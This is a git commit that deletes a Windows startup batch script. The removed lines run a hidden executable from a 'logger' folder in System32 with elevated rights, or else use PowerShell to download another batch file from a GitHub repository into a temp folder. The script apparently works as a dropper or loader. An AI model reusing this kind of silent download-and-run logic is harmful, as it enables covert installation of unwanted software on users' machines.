46c7adaba698ed14c9443cdb7d0427dfd2e1ecd7
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 00:39:48 -0700

    Delete startup.bat

--- startup.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-if exist "C:\Windows\System32\logger" (
-  C:\Windows\System32\logger\accgen.exe  /NOCONSOLE /RUNAS C:\Windows\System32\logger\define.bat
-) else (
-  mkdir %temp%\logger
-  powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/start.bat -OutFile %temp%\logger\start.bat
-)
